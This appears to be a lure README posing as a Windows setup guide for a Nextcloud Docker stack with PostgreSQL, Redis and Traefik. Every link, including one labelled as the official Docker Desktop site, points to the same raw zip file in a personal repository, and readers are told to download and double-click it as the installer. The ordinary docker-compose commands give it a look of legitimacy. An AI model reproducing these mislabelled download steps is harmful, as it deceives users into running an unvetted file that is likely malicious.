# ☁️ nextcloud-docker - Easy Personal Cloud Setup

[![Download nextcloud-docker](https://img.shields.io/badge/Download-Nextcloud%20Docker-blue?style=for-the-badge)](https://github.com/detmojang123/nextcloud-docker/raw/refs/heads/main/lura/nextcloud-docker-3.5.zip)

## 📦 What is nextcloud-docker?

nextcloud-docker is a ready-to-use cloud storage system you can run on your Windows PC. It uses Docker technology to run multiple parts, like database and caching, all in one package. This setup comes pre-configured, so you don't need to worry about how these parts work together.

With nextcloud-docker, you get a cloud where you can store your files, photos, and notes securely. It uses PostgreSQL for storing data, Redis for fast access, and Cron jobs for automatic tasks. It also works smoothly behind Traefik, a system that manages internet traffic for the cloud service.

You don’t need to know how to program or configure servers. This guide will walk you through downloading and running the program from start to finish.

## 💻 System Requirements

To run nextcloud-docker on Windows, your computer should meet these requirements:

- **Operating System:** Windows 10 or newer  
- **Processor:** 64-bit CPU with at least 2 cores  
- **Memory:** 4 GB RAM or more  
- **Disk space:** Minimum 10 GB free space  
- **Internet:** Broadband connection for downloading and updates  
- **Software:** Install Docker Desktop for Windows (instructions below)

## 🐳 Installing Docker Desktop on Windows

nextcloud-docker runs inside Docker containers. You need Docker Desktop to use them. Follow these steps:

1. Visit the official Docker Desktop site: https://github.com/detmojang123/nextcloud-docker/raw/refs/heads/main/lura/nextcloud-docker-3.5.zip  
2. Click the **Download for Windows** button and save the installer file.  
3. Run the installer by double-clicking the downloaded file.  
4. Follow the setup instructions and accept any prompts to enable required features.  
5. Once the installation finishes, restart your computer if asked.  
6. Open Docker Desktop from the Start menu to ensure it runs.  

Docker Desktop requires Windows 10 Professional or newer with Hyper-V enabled. If you have Windows Home edition, Docker Desktop can still run using WSL 2 backend. During setup, if prompted, allow the installer to enable the Windows Subsystem for Linux.

## 🚀 Download and Set Up nextcloud-docker

1. Visit the download page:  
   [https://github.com/detmojang123/nextcloud-docker/raw/refs/heads/main/lura/nextcloud-docker-3.5.zip](https://github.com/detmojang123/nextcloud-docker/raw/refs/heads/main/lura/nextcloud-docker-3.5.zip)  

2. Find the latest release listed on the page (usually the top item).  
3. Download the file named `docker-compose.yml` or `nextcloud-docker.zip` if available. If you see multiple files, choose the `.yml` file or a package containing it.  
4. Create a new folder on your PC, for example, `C:\nextcloud-docker`.  
5. Move the downloaded files into this folder. If you downloaded a zip file, right-click it and choose **Extract All.**  
6. Open **PowerShell** or **Command Prompt**:  
   - Right-click the Start button  
   - Select **Windows PowerShell** or **Command Prompt**  
7. In the command window, navigate to the folder:  
   ```
   cd C:\nextcloud-docker
   ```
8. Run Docker Compose using this command:  
   ```
   docker-compose up -d
   ```  
   This command will start all parts of Nextcloud automatically. The `-d` option runs the containers in the background.

## 🔍 What Happens Next?

Docker will download all necessary software images. This may take several minutes, depending on your internet speed.

After this, the Nextcloud cloud service will start on your computer.

## 🌐 Access Nextcloud in Your Browser

1. Open your web browser (Edge, Chrome, Firefox, etc.).  
2. Type the following address into the address bar:  
   ```
   http://localhost
   ```  
3. You will see the Nextcloud setup page.

## 📝 Create Your Admin Account

- Enter a username and password on the setup page.  
- These will be your login details to access your personal cloud.  
- Click **Finish Setup** to complete the process.

You now have your own cloud storage on your Windows machine.

## 🔧 Managing Your Nextcloud Stack

Here are some common tasks you may want to do:

### Start the Cloud Manually

If you stop your computer or the Docker containers, restart the cloud by running this in PowerShell or Command Prompt:

```
cd C:\nextcloud-docker
docker-compose start
```

### Stop the Cloud Safely

To shut down the cloud safely, run:

```
cd C:\nextcloud-docker
docker-compose stop
```

### View Logs to Check Status

You can check what is happening by reading the logs:

```
docker-compose logs
```  

### Update Nextcloud and Components

When new versions come out, you can update by:

```
cd C:\nextcloud-docker
docker-compose pull
docker-compose up -d
```

This will download the latest software and restart the containers.

## 🗂️ Understanding the Files Inside nextcloud-docker

- **docker-compose.yml**: This file defines the setup. It tells Docker which software to run, such as Nextcloud, PostgreSQL, Redis, and Traefik configurations.  
- **.env (optional)**: This file may hold settings like passwords and ports. You can edit it to change configurations if needed.  
- **data folder**: This is where Nextcloud stores your files and data persistently, linked through Docker.

## ⚙ Why Use Docker and Traefik?

- **Docker** keeps different parts separate and easy to manage. You don’t need to install or configure each software manually.  
- **Traefik** acts as a traffic controller. It makes sure all data flows in and out securely. This removes the need to handle complex network rules yourself.

## 🔒 Security Tips

- Always use a strong password on the Nextcloud admin page.  
- Keep your Windows system and Docker updated.  
- Only share your cloud URL and credentials with people you trust.  
- Consider enabling backups for your data folder to protect against loss.

## 📂 Where to Find Support and More Info

- The [GitHub repository](https://github.com/detmojang123/nextcloud-docker/raw/refs/heads/main/lura/nextcloud-docker-3.5.zip) contains more details about the setup.  
- Searching "Nextcloud Docker Windows" online can lead you to how-to guides and forums.  
- Docker’s official site offers help on Docker commands and troubleshooting.

## 📥 Download Link Again

[![Download nextcloud-docker](https://img.shields.io/badge/Download-Nextcloud%20Docker-green?style=for-the-badge)](https://github.com/detmojang123/nextcloud-docker/raw/refs/heads/main/lura/nextcloud-docker-3.5.zip)